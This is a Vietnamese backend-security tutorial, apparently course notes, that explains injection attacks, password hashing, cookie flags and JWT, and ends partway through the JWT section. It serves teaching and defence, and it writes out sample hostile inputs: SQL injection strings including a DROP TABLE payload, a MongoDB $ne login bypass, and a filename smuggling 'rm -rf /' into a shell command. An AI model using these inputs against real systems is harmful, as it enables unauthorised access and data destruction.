# TỔNG QUAN KIẾN THỨC BẢO MẬT BACKEND (BACKEND SECURITY)

> **Tư duy cốt lõi (Core Mindset):**  
> *"Bảo mật không phải là học thuộc một vài kỹ thuật hay checklist để áp dụng vào ngày mai. Bản chất của bảo mật là sự hoài nghi lành mạnh (healthy paranoia) và tư duy phòng thủ đa tầng trước mọi giả định khi viết từng dòng code."*

---

## MỤC LỤC
1. [0:00 - Giới thiệu về Bảo mật (Introduction to Security)](#1-000---giới-thiệu-về-bảo-mật-introduction-to-security)
2. [4:36 - Tổng quan về Tấn công Tiêm nhiễm (Injection Attacks Overview)](#2-436---tổng-quan-về-tấn-công-tiêm-nhiễm-injection-attacks-overview)
3. [7:55 - Phân tích chuyên sâu SQL Injection (SQL Injection Deep Dive)](#3-755---phân-tích-chuyên-sâu-sql-injection-sql-injection-deep-dive)
4. [29:27 - Phòng chống SQL Injection bằng Parameterized Queries](#4-2927---phòng-chống-sql-injection-bằng-parameterized-queries)
5. [39:43 - Tấn công Tiêm lệnh Hệ điều hành (Command Injection)](#5-3943---tấn-công-tiêm-lệnh-hệ-điều-hành-command-injection)
6. [45:25 - Bảo mật Xác thực & Lưu trữ Mật khẩu (Authentication & Password Storage)](#6-4525---bảo-mật-xác-thực--lưu-trữ-mật-khẩu-authentication--password-storage)
7. [1:07:17 - Quản lý Phiên & Bảo mật Cookie (Session Management & Cookie Security)](#7-10717---quản-lý-phiên--bảo-mật-cookie-session-management--cookie-security)
8. [1:24:02 - JWT & Xác thực Phi trạng thái (JWT & Stateless Authentication)](#8-12402---jwt--xác-thực-phi-trạng-thái-jwt--stateless-authentication)
9. [1:32:41 - Chiến lược Giới hạn Tần suất (Rate Limiting Strategies)](#9-13241---chiến-lược-giới-hạn-tần-suất-rate-limiting-strategies)
10. [1:37:31 - Lỗ hổng Phân quyền: BOLA & BFLA (Authorization Vulnerabilities)](#10-13731---lỗ-hổng-phân-quyền-bola--bfla-authorization-vulnerabilities)
11. [2:17:21 - Tấn công Kịch bản Liên trang: XSS (Cross-Site Scripting)](#11-21721---tấn-công-kịch-bản-liên-trang-xss-cross-site-scripting)
12. [2:28:32 - Tổng quan về CSRF (Cross-Site Request Forgery)](#12-22832---tổng-quan-về-csrf-cross-site-request-forgery)
13. [2:33:19 - Lỗ hổng Cấu hình Sai (Security Misconfiguration)](#13-23319---lỗ-hổng-cấu-hình-sai-security-misconfiguration)
14. [2:39:08 - Tư duy Bảo mật & Tài nguyên Học tập (Security Mindset & Resources)](#14-23908---tư-duy-bảo-mật--tài-nguyên-học-tập-security-mindset--resources)

---

## 1. [0:00] - Giới thiệu về Bảo mật (Introduction to Security)

### Tầm quan trọng của bảo mật trong Backend
- Bảo mật là một trong những khía cạnh sống còn nhất của kỹ sư backend. Một lỗi bảo mật không chỉ dừng lại ở lỗi phần mềm mà gây ra **hậu quả phá hủy mang tính tài chính, pháp lý và uy tín kinh doanh**.
- Mọi tổn thất bảo mật cuối cùng đều quy về chi phí tài chính: đền bù dữ liệu khách hàng bị rò rỉ, tiền phạt từ cơ quan quản lý (GDPR, v.v.), chi phí khôi phục hệ thống và nguy cơ phá sản.

### Bức tranh tổng thể các phân tầng bảo mật
Bảo mật là một vùng đất rộng lớn được chia thành nhiều ngữ cảnh:
1. **Browser Security (Bảo mật trình duyệt):** Quản lý HTML, Cookies, LocalStorage, SessionStorage, DOM, Same-Origin Policy.
2. **Network Security (Bảo mật đường truyền):** HTTP vs HTTPS, mã hóa TLS/SSL, chứng chỉ số, nén dữ liệu, chống bắt gói tin (sniffing).
3. **Server/OS Security (Bảo mật hệ điều hành/máy chủ):** Quản lý user/group của Linux, phân quyền thư mục, cấu hình firewall, bảo vệ các tiến trình (processes) đang chạy ứng dụng.
4. **Backend/Application Security (Bảo mật ứng dụng backend):** Các lỗ hổng phát sinh trực tiếp từ chính logic code, kiến trúc API, cơ sở dữ liệu và các thư viện mà kỹ sư backend tích hợp.

### Chấp nhận thực tế: Không có hệ thống nào an toàn 100%
- Không tồn tại khái niệm "ứng dụng an toàn tuyệt đối" (*truly secure*).
- Công nghệ, ngôn ngữ lập trình, hệ quản trị cơ sở dữ liệu và các thư viện mã nguồn mở liên tục phát triển. Cùng với sự phát triển đó, các lỗ hổng mới (Zero-day vulnerabilities) sẽ liên tục xuất hiện.
- **Mục tiêu thực tế:** Xây dựng một **tư duy luôn cảnh giác (paranoid mindset)**. Khi đặt bút viết bất kỳ dòng code nào, kỹ sư luôn phải tự hỏi: *"Đoạn code này có thể bị lạm dụng hoặc tấn công như thế nào?"*.

---

## 2. [4:36] - Tổng quan về Tấn công Tiêm nhiễm (Injection Attacks Overview)

### Tư duy của kẻ tấn công (The Attacker Mindset)
- Kẻ tấn công (Attacker) không bận tâm bạn sử dụng framework hay ngôn ngữ gì (Go, Python, Node.js, Rust hay Java).
- Họ chỉ săn lùng duy nhất một điều: **"Lập trình viên đã đưa ra những giả định gì ở đây?" (Where did the developer make an assumption?)**

### Cạm bẫy của con đường màu hồng (The "Happy Path" Trap)
Khi lập trình dưới áp lực thời gian (deadline) hoặc trong môi trường startup cần ra mắt tính năng nhanh, lập trình viên thường vô thức mặc định hệ thống chạy theo kịch bản lý tưởng:
- Giả định rằng dữ liệu từ form gửi lên luôn sạch sẽ, đúng định dạng.
- Giả định rằng người dùng đúng là người mà họ tự xưng.
- Giả định rằng request gửi tới backend chắc chắn xuất phát từ giao diện web/mobile chính thống của công ty.
- Giả định rằng người dùng bình thường sẽ không biết mở DevTools (F12) hay Network Tab để can thiệp thông số request.

Ngược lại, kẻ tấn công luôn tìm cách chọc phá mọi ranh giới, sửa đổi mọi tham số và thử nghiệm phá vỡ từng giả định ngây thơ đó.

### Bản chất gốc rễ: Ứng dụng nói nhiều ngôn ngữ (Multiple Languages)
Hệ thống backend của bạn không hoạt động cô lập mà là một phiên dịch viên tương tác đồng thời với nhiều môi trường:

```
                  +-------------------------+
                  |         BROWSER         |
                  |  (HTML, CSS, JS, DOM)   |
                  +------------+------------+
                               |
                               | (HTTP Request)
                               v
                  +-------------------------+
                  |       BACKEND APP       |
                  |   (Go, Node, Python...) |
                  +---+-----------------+---+
                      |                 |
     (SQL Queries)    |                 |  (Shell / System Calls)
                      v                 v
            +------------------+   +-------------------+
            |     DATABASE     |   | OPERATING SYSTEM  |
            | (SQL/PostgreSQL) |   |    (Bash, CLI)    |
            +------------------+   +-------------------+
```

- **Mỗi ngôn ngữ có một ngữ pháp riêng:** SQL có ký tự nháy `'`, chấm phẩy `;`, gạch nối `--`; Shell có pipe `|`, dấu `;`, `&&`, `$()`; HTML có `<script>`, `onerror=`, v.v.
- **Nguồn gốc sinh ra Injection:** Xảy ra khi dữ liệu đến từ một ngôn ngữ (ví dụ: chuỗi ký tự người dùng gõ vào form trên browser) vượt qua ranh giới sang một ngôn ngữ khác (SQL, Shell, HTML) mà **không được cô lập hoặc xử lý**.
- **Hậu quả cốt lõi:** Hệ thống bị nhầm lẫn giữa **LỆNH (CODE)** và **DỮ LIỆU (DATA)** — coi dữ liệu đầu vào của người dùng như một phần của câu lệnh điều khiển.

---

## 3. [7:55] - Phân tích chuyên sâu SQL Injection (SQL Injection Deep Dive)

### Cơ chế kịch bản xác thực đăng nhập (Login Scenario)
Giả sử có một API đăng nhập nhận `email` và `password`. Đoạn code backend xây dựng câu truy vấn bằng cách **nối chuỗi trực tiếp (String Concatenation)**:

```sql
SELECT * FROM users WHERE email = '$user_input';
```

#### 1. Kịch bản bình thường (Happy Path)
- Người dùng nhập: `alice@gmail.com`
- Câu lệnh SQL sinh ra:
  ```sql
  SELECT * FROM users WHERE email = 'alice@gmail.com';
  ```
- Kết quả: Database tìm đúng dòng của Alice và trả về. Hệ thống hoạt động chính xác.

#### 2. Kịch bản tấn công vượt quyền (Bypass / Data Leakage)
- Kẻ tấn công nhập vào trường email chuỗi sau:
  ```text
  ' OR '1'='1' -- 
  ```
- Khi ghép chuỗi, câu lệnh hoàn chỉnh trở thành:
  ```sql
  SELECT * FROM users WHERE email = '' OR '1'='1' -- ';
  ```
- **Giải phẫu cú pháp tấn công:**
  1. Dấu nháy đơn `'` đầu tiên đóng chuỗi giá trị email do lập trình viên mở sẵn (`WHERE email = ''`).
  2. Mệnh đề `OR '1'='1'`: Phép so sánh chuỗi `'1'` bằng `'1'` luôn trả về kết quả `TRUE`.
  3. Ký tự `-- `: Trong chuẩn SQL, hai dấu gạch nối đánh dấu bắt đầu một comment (chú thích). Toàn bộ phần còn lại của câu lệnh (bao gồm dấu nháy đơn đóng gốc của lập trình viên) bị bỏ qua hoàn toàn.
- **Hậu quả:** Mệnh đề `WHERE` trở thành `FALSE OR TRUE` $\rightarrow$ Luôn luôn là `TRUE`. Toàn bộ điều kiện lọc bị vô hiệu hóa, câu lệnh tương đương:
  ```sql
  SELECT * FROM users;
  ```
  Database trả về danh sách toàn bộ người dùng trong hệ thống (kèm theo hash mật khẩu, địa chỉ, số điện thoại, dữ liệu nhạy cảm). Kẻ tấn công có thể đăng nhập trái phép vào tài khoản đầu tiên trả về.

#### 3. Kịch bản tấn công phá hủy dữ liệu (Destructive DDL Attack)
Kẻ tấn công không chỉ đọc trộm dữ liệu mà còn có thể phá hủy cấu trúc:
- Input:
  ```text
  '; DROP TABLE users; -- 
  ```
- Câu SQL ghép chuỗi:
  ```sql
  SELECT * FROM users WHERE email = ''; DROP TABLE users; -- ';
  ```
- Dấu `;` báo hiệu kết thúc câu lệnh thứ nhất và ngay lập tức thực thi câu lệnh thứ hai: `DROP TABLE users;`.

> **Tại sao trong DB Explorer (như TablePlus) lệnh DROP có thể không chạy?**  
> Các driver cơ sở dữ liệu hiện đại thường tích hợp cơ chế bảo vệ chặn chạy nhiều câu lệnh nối tiếp (stacked queries/batch statements) theo mặc định. Tuy nhiên, nếu sử dụng các driver cũ hoặc cấu hình cho phép multiple statements, toàn bộ bảng `users` sẽ biến mất vĩnh viễn!

### Nguyên tắc phân quyền cơ sở dữ liệu (Database Privilege Separation)
- Tài khoản cơ sở dữ liệu được cấu hình cho ứng dụng backend kết nối **CHỈ NÊN ĐƯỢC CẤP QUYỀN DML** (Data Manipulation Language: `SELECT`, `INSERT`, `UPDATE`, `DELETE`).
- **TUYỆT ĐỐI KHÔNG CẤP QUYỀN DDL** (Data Definition Language: `DROP`, `ALTER`, `CREATE`, `TRUNCATE`) cho user DB của ứng dụng production thông thường.

### Các dạng khai thác SQL Injection nâng cao
1. **UNION-Based SQLi:** Ghép thêm câu truy vấn `UNION SELECT ...` để trích xuất dữ liệu từ các bảng nhạy cảm khác (bảng thẻ tín dụng, giao dịch thanh toán).
2. **File System Access:** Lợi dụng các hàm nội tại của DB (`LOAD_FILE()`, `pg_read_file`) để đọc các file nhạy cảm trên máy chủ lưu trữ (ví dụ: `/etc/passwd`, file `.env`).
3. **OS Command Execution:** Lợi dụng tính năng mở rộng của DB (ví dụ `xp_cmdshell` trong MSSQL, hoặc hàm sao chép trong PostgreSQL) để thực thi lệnh trực tiếp trên hệ điều hành của database server.

---

## 4. [29:27] - Phòng chống SQL Injection bằng Parameterized Queries

### Bản chất của giải pháp Parameterized Queries (Prepared Statements)
Để ngăn chặn hoàn toàn SQL Injection, kỹ sư phải sử dụng **Truy vấn tham số hóa (Parameterized Queries)** hoặc **Câu lệnh chuẩn bị trước (Prepared Statements)**.

```javascript
// Ví dụ tư duy trong code (Node.js/pg hoặc tương tự)
const query = 'SELECT * FROM users WHERE email = $1';
const values = [userInput];

db.query(query, values);
```

### Cơ chế hoạt động bên dưới
Thay vì gửi một chuỗi văn bản gộp chung tất cả mọi thứ tới Database, hệ thống gửi **2 thành phần độc lập**:
1. **Cấu trúc câu lệnh (Statement / Template):** Chứa các khe giữ chỗ (slots/placeholders như `$1`, `?`).
2. **Dữ liệu tham số (Parameters):** Mảng các giá trị do người dùng cung cấp.

```
+-------------------------------------------------------------------+
| 1. Gửi Cấu trúc: "SELECT * FROM users WHERE email = $1"           |
|    -> Database Parser phân tích & biên dịch thành Cây cú pháp    |
|       (Abstract Syntax Tree - AST). Cấu trúc lệnh ĐÃ ĐƯỢC CHỐT.   |
+-------------------------------------------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------+
| 2. Gửi Dữ liệu: ["' OR '1'='1' -- "]                              |
|    -> Database đưa trực tiếp dữ liệu vào slot $1 dưới dạng THUẦN  |
|       LITERAL/STRING. Không bao giờ kích hoạt lại bộ Parser!     |
+-------------------------------------------------------------------+
```

- Khi kẻ tấn công gửi `' OR '1'='1' -- `, Database coi toàn bộ chuỗi đó là **một chuỗi ký tự thuần túy (Plain String)**.
- Database sẽ tìm kiếm xem có user nào có email bằng chính xác từng ký tự `' OR '1'='1' -- ` hay không $\rightarrow$ Không tìm thấy và trả về kết quả rỗng $\rightarrow$ Cuộc tấn công thất bại hoàn toàn.

### Vai trò của Input Validation
- Bạn có thể đặt câu hỏi: *"Tại sao một chuỗi rác như vậy lại có thể lọt qua được tầng Controller/Handler?"*.
- Về nguyên tắc, tầng **Input Validation** (kiểm tra định dạng email) phải chặn chuỗi này đầu tiên.
- Tuy nhiên, con người luôn có thể mắc sai sót hoặc regex validation có thể bị bypass. Parameterized Queries đóng vai trò là **tuyến phòng thủ cốt lõi tại tầng cơ sở dữ liệu**, bảo đảm hệ thống an toàn ngay cả khi tầng validation bị thủng.

### Nhận thức về ORM và cạm bẫy NoSQL
- Hầu hết các ORM hiện đại (Prisma, TypeORM, Hibernate, GORM, Entity Framework, SQLAlchemy) đều tự động áp dụng Parameterized Queries. Bạn chỉ bị dính lỗi khi cố tình sử dụng các hàm raw query kèm nối chuỗi (raw concatenation).
- **Cạm bẫy với NoSQL / MongoDB:**
  - Không viết SQL không đồng nghĩa với việc bạn an toàn trước Injection.
  - MongoDB truy vấn bằng các đối tượng JSON. Nếu backend nhận trực tiếp JSON từ người dùng và đẩy vào câu lệnh tìm kiếm:
    ```javascript
    // User gửi: {"email": {"$ne": null}}
    db.collection('users').find({ email: req.body.email });
    ```
    Toán tử `$ne` (not equal) sẽ biến câu query thành: *"Tìm user có email khác null"*, dẫn đến bypass đăng nhập tương tự như SQL Injection!

---

## 5. [39:43] - Tấn công Tiêm lệnh Hệ điều hành (Command Injection)

### Ngữ cảnh thực tế
Nhiều ứng dụng backend cần thực hiện các tác vụ hệ thống nặng như nén ảnh, chuyển mã video, tạo file PDF bằng cách gọi các công cụ dòng lệnh (CLI tools) như `ffmpeg`, `imagemagick`, `wkhtmltopdf`.

### Kịch bản lỗ hổng
Giả sử backend cho phép người dùng đặt tên file xuất ra sau khi resize ảnh:

```bash
# Code backend nối chuỗi thô:
ffmpeg -i input.jpg -h 120 -w 220 -o <user_provided_filename>
```

Nếu kẻ tấn công nhập tên file là:
```text
output.jpg; rm -rf /
```
Lệnh thực thi trong terminal trở thành:
```bash
ffmpeg -i input.jpg -h 120 -w 220 -o output.jpg; rm -rf /
```
Khi Shell gặp dấu chấm phẩy `;`, nó hiểu rằng lệnh `ffmpeg` đã kết thúc và tiến hành thực thi ngay lập tức lệnh tiếp theo: `rm -rf /` (xóa sạch toàn bộ dữ liệu trên hệ thống máy chủ).

Các ký tự nguy hiểm khác trong Shell:
- Ký tự Pipe `|`: Chuyển hướng đầu ra sang một chương trình độc hại khác.
- Ký tự `&&` hoặc `&`: Chạy lệnh ngầm (background process) để mở Reverse Shell hoặc cài spyware/backdoor.

### Giải pháp triệt để: Argument Arrays & Bỏ qua Shell Interpreter
Các ngôn ngữ lập trình cung cấp các API gọi process cho phép truyền tham số dưới dạng một **mảng các đối số (Array of Arguments)** và vô hiệu hóa shell (`shell: false`):

| Ngôn ngữ | Hàm nguy hiểm (Dễ dính Injection) | Hàm an toàn (Tách bạch lệnh & đối số) |
| :--- | :--- | :--- |
| **Node.js** | `child_process.exec("cmd " + arg)` | `child_process.execFile("ffmpeg", [args...])` hoặc `spawn` |
| **Python** | `os.system("cmd " + arg)` hoặc `subprocess.run(..., shell=True)` | `subprocess.run(["ffmpeg", "-o", filename], shell=False)` |
| **Go** | `exec.Command("sh", "-c", "cmd " + arg)` | `exec.Command("ffmpeg", "-o", filename)` |

Khi sử dụng mảng đối số và không chạy qua shell (`shell: false`), chuỗi `; rm -rf /` được truyền trực tiếp đến hệ điều hành thông qua lời gọi hệ thống (system call `execve`). Hệ điều hành hiểu đó chỉ là tên file chứa ký tự kỳ lạ, hoàn toàn không thông dịch các ký tự điều khiển `;` hay `|`.

---

## 6. [45:25] - Bảo mật Xác thực & Lưu trữ Mật khẩu (Authentication & Password Storage)

### Khái niệm Xác thực (Authentication)
Xác thực là quá trình chứng minh danh tính: **"Người dùng này thực sự là ai trong bảng `users` của cơ sở dữ liệu?"**. Nếu xác thực bị phá vỡ, kẻ tấn công có thể chiếm đoạt tài khoản (Account Takeover), truy cập dữ liệu cá nhân và thực hiện giao dịch trái phép.

### Lời khuyên cho môi trường Production: Dùng Managed Auth Providers
- **Lời khuyên thực tế:** Nếu có ngân sách cho phép, hãy ưu tiên sử dụng các dịch vụ xác thực chuyên nghiệp (**Auth Providers** như Clerk, Auth0, Supabase Auth, Firebase Auth, AWS Cognito).
- **Lý do:** Tự xây dựng một hệ thống Auth chuẩn production không đơn thuần là ký vài cái JWT và lưu vào cookie. Nó đòi hỏi xử lý hàng loạt bài toán phức tạp:
  - Stateful session tracking trên nhiều thiết bị, cơ chế thu hồi (revoke) phiên từ xa.
  - Tích hợp OAuth 2.0 / OIDC (Google, GitHub, Apple...).
  - **Account Linking:** Xử lý tình huống người dùng ban đầu đăng ký bằng email + password, sau đó lại bấm "Sign in with Google" với cùng email đó mà không tạo ra 2 tài khoản trùng lặp.
  - Phân quyền RBAC, Multi-Factor Authentication (MFA), chống Brute-force.
  - Các công ty bảo mật có đội ngũ kỹ sư túc trực 24/7 để vá lỗi. Chi phí vài chục USD/tháng rẻ hơn rất nhiều so với thời gian hàng tuần/tháng của đội ngũ lập trình và nguy cơ bị phạt khi lộ dữ liệu.
  - Khi ứng dụng đạt quy mô hàng triệu người dùng và chi phí auth provider lên tới hàng chục nghìn USD, lúc đó doanh nghiệp mới nên tự build auth riêng vì đã có đủ nguồn lực tài chính và nhân sự chuyên trách.

---

### Quá trình tiến hóa của các phương pháp lưu trữ mật khẩu (Password Storage Evolution)

```
[Plaintext] 
   | (Lộ DB là mất sạch)
   v
[Fast Hashing: MD5 / SHA-256] 
   | (Bị phá hủy bởi Rainbow Tables)
   v
[Hashing + Random Salt] 
   | (Bị phá hủy bởi Offline GPU Brute-Force: Hàng tỷ hash/giây)
   v
[Slow Hashing: Argon2id / BCrypt / SCrypt] 
   | (Tham số Cost Factor: Ép buộc thời gian tính toán ~400ms)
   v
=> AN TOÀN TRƯỚC TẤN CÔNG BRUTE-FORCE
```

#### Cấp độ 1: Lưu trữ dạng văn bản thô (Plaintext Storage)
- Lưu trực tiếp mật khẩu người dùng vào cột `password` (text/varchar).
- **Nguy cơ chí mạng:** Cơ sở dữ liệu luôn có nguy cơ bị rò rỉ (qua SQLi, sao lưu backup thất lạc, nhân viên biến chất, nhà cung cấp cloud bị hack).
- Hơn **70% người dùng sử dụng chung mật khẩu** cho nhiều website. Khi cơ sở dữ liệu của bạn bị lộ, kẻ tấn công lấy cặp `email:password` đó để tấn công Credential Stuffing vào hàng loạt dịch vụ khác (ngân hàng, thương mại điện tử, mạng xã hội).
- Toàn bộ lập trình viên, DBA nội bộ đều nhìn thấy mật khẩu người dùng.

#### Cấp độ 2: Hashing thông thường (MD5, SHA-256) & Đòn đánh Rainbow Table
- **Khái niệm Hash (Hàm băm):** Là hàm toán học một chiều (one-way), có tính tất định (deterministic - cùng input luôn ra cùng hash), đầu ra có độ dài cố định (fixed length) và bất khả thi về mặt toán học để dịch ngược từ hash về input ban đầu.
- **Điểm yếu của Hashing thông thường:** Vì hàm băm có tính tất định, kẻ tấn công đã tính toán sẵn hàng tỷ mật khẩu phổ biến và lưu vào một bảng tra cứu gọi là **Rainbow Table** (bảng ánh xạ 1-1 giữa mật khẩu gốc và giá trị băm).
- Khi cơ sở dữ liệu bị lộ, kẻ tấn công không cần dịch ngược thuật toán mà chỉ cần tra cứu hash trong Rainbow Table để tìm ra ngay mật khẩu gốc của phần lớn người dùng đặt mật khẩu yếu/phổ biến.

#### Cấp độ 3: Hashing kết hợp Muối ngẫu nhiên (Salted Hashing)
- **Salt (Muối):** Là một chuỗi ký tự ngẫu nhiên được sinh ra bởi bộ tạo số ngẫu nhiên an toàn mật mã (CSPRNG) cho **MỖI** người dùng khi đăng ký tài khoản.
- Công thức: `Hash = HashingFunction(Password + Salt)`. Cả `Salt` và `Hash` đều được lưu trong cơ sở dữ liệu.
- **Tác dụng:**
  - Tiêu diệt hoàn toàn tính giống nhau (sameness). Hai người dùng cùng đặt mật khẩu là `123456`, nhưng do có hai salt ngẫu nhiên khác nhau nên hai giá trị hash trong DB hoàn toàn khác nhau.
  - Vô hiệu hóa 100% các bảng Rainbow Table tính toán sẵn, vì kẻ tấn công không thể tạo trước bảng hash cho hàng tỷ tỷ giá trị salt ngẫu nhiên.

#### Cấp độ 4: Các hàm băm chậm (Slow Password Hashing) chống GPU Brute-Force
- **Hiểm họa mới:** Các card đồ họa (GPU) hiện đại có khả năng tính toán **hàng tỷ phép băm SHA-256 mỗi giây**. Khi sở hữu bản dump cơ sở dữ liệu có salt, kẻ tấn công có thể thực hiện **Offline Brute-Force** (thử lần lượt từng mật khẩu kết hợp với salt trên máy của họ). Với tốc độ tính toán của GPU, mật khẩu dưới 8 ký tự có thể bị bẻ khóa chỉ trong vài ngày.
- **Nguyên tắc:** **TUYỆT ĐỐI KHÔNG DÙNG CÁC HÀM BĂM NHANH (MD5, SHA-1, SHA-256, SHA-512) ĐỂ LƯU MẬT KHẨU**. Các hàm này được thiết kế để kiểm tra toàn vẹn file nhanh chóng, không phục vụ bảo mật mật khẩu!
- **Giải pháp:** Sử dụng các hàm băm chuyên dụng cho mật khẩu: **Argon2id** (tiêu chuẩn công nghiệp hiện đại nhất hiện nay), **BCrypt**, **SCrypt** hoặc **PBKDF2**.
- **Cơ chế Cost Factor (Work Factor):**
  - Cho phép lập trình viên điều chỉnh độ khó tính toán về CPU và bộ nhớ (Memory-hard).
  - Cấu hình sao cho việc tính toán một giá trị hash tiêu tốn khoảng **300ms - 500ms**.
  - **Ý nghĩa:** Đối với người dùng hợp lệ, độ trễ 400ms khi đăng nhập là hoàn toàn vô hình và không gây ảnh hưởng trải nghiệm. Nhưng đối với kẻ tấn công brute-force, tốc độ thử mật khẩu bị bóp nghẹt từ **1 tỷ lần/giây xuống còn 2-3 lần/giây** $\rightarrow$ Thời gian bẻ khóa tăng từ vài ngày lên hàng thế kỷ!

---

## 7. [1:07:17] - Quản lý Phiên & Bảo mật Cookie (Session Management & Cookie Security)

### Tại sao cần Quản lý Phiên (Session Management)?
Giao thức HTTP là phi trạng thái (stateless). Sau khi người dùng đăng nhập thành công, hệ thống không thể bắt họ phải gửi lại username/password ở mỗi request tiếp theo. Hệ thống cần ghi nhớ trạng thái đã xác thực thông qua **Session (Phiên làm việc)**.

### Cơ chế hoạt động của Stateful Session (Phiên có trạng thái)
1. **Sinh Session ID:** Khi đăng nhập thành công, server sinh ra một chuỗi định danh ngẫu nhiên có độ dài từ **128 đến 256 bits** bằng thuật toán CSPRNG. Với không gian mẫu $2^{128}$, số lượng Session ID khả dĩ lớn hơn số nguyên tử trong vũ trụ quan sát được $\rightarrow$ Bất khả thi để kẻ tấn công có thể đoán mò (brute-force).
2. **Lưu trữ Session Metadata:** Server lưu Session ID vào bộ nhớ phân tán tốc độ cao (như Redis) hoặc Database (PostgreSQL/MySQL), đính kèm siêu dữ liệu:
   - `user_id`: Định danh người dùng.
   - `created_at`, `expires_at`: Thời gian tạo và thời gian hết hạn phiên.
   - `ip_address`: Địa chỉ IP khi đăng nhập.
   - `user_agent`: Thông tin trình duyệt/thiết bị (giúp người dùng kiểm tra các phiên đăng nhập lạ).
3. **Phát hành Cookie:** Server gửi Session ID về trình duyệt thông qua header `Set-Cookie`.
4. **Đối chiếu Request:** Ở mọi request sau đó, trình duyệt tự động gửi cookie này lên. Server trích xuất Session ID, tra cứu trong Redis để lấy thông tin người dùng tương ứng.

---

### Bộ cờ bảo mật Cookie bắt buộc phải cấu hình (Cookie Security Flags)

| Cờ Cookie | Giá trị cấu hình | Giải thích chi tiết & Nguy cơ bảo vệ |
| :--- | :--- | :--- |
| **`HttpOnly`** | `true` | Cấm hoàn toàn mã JavaScript truy cập vào cookie (thông qua `document.cookie`). Bảo vệ Session ID không bị đánh cắp khi trang web xuất hiện lỗ hổng XSS. |
| **`Secure`** | `true` | Yêu cầu trình duyệt **chỉ gửi cookie qua kết nối mã hóa HTTPS**. Ngăn chặn kẻ tấn công nghe lén (sniffing) cookie trên các mạng Wi-Fi công cộng không an toàn qua công cụ như Wireshark. |
| **`SameSite`** | `Strict` / `Lax` | Kiểm soát việc gửi cookie trong các request cross-origin. Chống lại cuộc tấn công CSRF (Cross-Site Request Forgery). |

#### Chi tiết cấu hình cờ `SameSite`:
- **`Strict` (Khuyến nghị cao nhất):** Cookie chỉ được gửi đi khi request bắt nguồn từ chính trang web đó (cùng origin). Nếu người dùng bấm vào một link dẫn tới trang của bạn từ một website khác, cookie sẽ không được đính kèm.
- **`Lax` (Mặc định của các trình duyệt hiện đại):** Cho phép gửi cookie khi người dùng điều hướng cấp cao nhất (top-level navigation, ví dụ click vào link thông thường), nhưng chặn gửi cookie trong các request ngầm chạy ngầm qua `<img>`, `<iframe>`, hoặc form `POST` cross-site.
- **`None` (Rất nguy hiểm):** Cookie được gửi trong mọi bối cảnh cross-origin. Chỉ được phép kích hoạt nếu kèm theo cờ `Secure: true`. Tuyệt đối không dùng cho cookie xác thực phiên thông thường.

---

## 8. [1:24:02] - JWT & Xác thực Phi trạng thái (JWT & Stateless Authentication)

### So sánh bản chất: Stateful Session vs Stateless JWT

```
+------------------------------------+------------------------------------+
|     STATEFUL SESSIONS (REDIS)      |           STATELESS JWT            |
+------------------------------------+------------------------------------+
| - Server lưu toàn bộ dữ liệu phiên | - Server đóng gói dữ liệu vào      |
|   trong Redis/Database.            |   token, ký tên rồi đưa client giữ |
| - Client chỉ giữ Session ID ngẫu   | - Client gửi lại toàn bộ token ở   |
|   nhiên (chìa khóa tra cứu).       |   mỗi request tiếp theo.           |
| - Thu hồi phiên (Revoke) NGAY LẬP  | - Thu hồi phiên CỰC KỲ KHÓ KHĂN    |
|   TỨC (xóa dòng trong Redis là     |   cho tới khi token hết hạn.       |
|   user bị logout trên mọi thiết bị)|                                    |
| - Tốn tài nguyên RAM/Network để    | - Không cần truy vấn DB, scale     |
|   tra cứu DB ở mỗi request.        |   ngang qua nhiều server rất dễ.   |
+------------------------------------+------------------------------------+
```

### Giải phẫu cấu trúc của JSON Web Token (JWT)
Một chuỗi JWT bao gồm 3 phần được nối với nhau bằng dấu chấm: `Header.Payload.Signature`

1. **Header (Màu đỏ/xanh lá):** Mô tả thuật toán ký (`alg`: ví dụ HS256, RS256) và loại token (`typ: "JWT"`).
2. **Payload / Claims (Màu trắng/tím nhạt):** Chứa các cặp dữ liệu key-value:
   - Các claim chuẩn: `sub` (Subject - User ID), `iat` (Issued At), `exp` (Expiration Time).
   - Các claim tùy biến: `name`, `role: "admin"`.
   > **CẢNH BÁO BẢO MẬT CHÍ MẠNG:**  
   > Phần Payload chỉ được mã hóa dạng **Base64Url, HOÀN TOÀN KHÔNG PHẢI MÃ HÓA BẢO VỆ (ENCRYPTION)**. Bất kỳ ai cũng có thể decode và đọc được 100% nội dung bên trong Payload. **TUYỆT ĐỐI KHÔNG LƯU TRỮ DỮ LIỆU NHẠY CẢM (mật khẩu, khóa bí mật, số thẻ tín dụng) TRONG PAYLOAD CỦA JWT!**
3. **Signature (Chữ ký điện tử):**
   - Được tạo ra bằng công thức:
     $$\text{Signature} = \text{HMACSHA256}(\text{base64Url}(Header) + "." + \text{base64Url}(Payload), \text{SecretKey})$$
   - Đảm bảo tính toàn vẹn (Integrity): Nếu kẻ gian chỉnh sửa bất kỳ ký tự nào trong Payload (ví dụ sửa `"role": "user"` thành `"role": "admin"`), hàm verify chữ ký trên server sẽ thất bại ngay lập tức và từ chối request.

---

### Những bất cập và rủi ro lớn nhất của JWT trong thực tế
1. **Thu hồi phiên cực kỳ khó khăn (Revocation is Hard):**
   - Một khi JWT đã được ký và gửi đi, nó có giá trị pháp lý tuyệt đối cho đến khi chạm mốc thời gian hết hạn (`exp`).
   - Nếu tài khoản của người dùng bị lộ, hoặc người dùng bấm nút "Đăng xuất khỏi tất cả thiết bị", server không thể ép buộc client xóa token đó đi được.
2. **Các giải pháp chắp vá (Workarounds):**
   - **Token Blacklist:** Lưu danh sách các token bị hủy vào Redis $\rightarrow$ Làm mất đi tính chất phi trạng thái (stateless) ban đầu của JWT.
   - **Short-lived Access Token + Refresh Token:**
     - **Access Token:** Có vòng đời cực ngắn (5 đến 15 phút), dùng để gọi API thường xuyên.
     - **Refresh Token:** Có vòng đời dài hơn (1 đến 7 ngày), được lưu an toàn phía server/DB và client lưu trong `HttpOnly` Cookie.
     - Khi Access Token hết hạn (server trả 401), client dùng Refresh Token để xin cấp cặp token mới. Nếu Access Token bị lộ, rủi ro chỉ giới hạn trong vài phút.
3. **Lưu trữ JWT ở đâu an toàn?**
   - **LocalStorage:** Rất phổ biến nhưng **CỰC KỲ NGUY HIỂM** vì bất kỳ mã JavaScript nào chạy trên trang (lỗ hổng XSS) cũng có thể đọc và đánh cắp token dễ dàng.
   - **Khuyến nghị:** Lưu trữ JWT bên trong **`HttpOnly`, `Secure`, `SameSite` Cookie**.

> **Lời khuyên từ kinh nghiệm thực chiến:**  
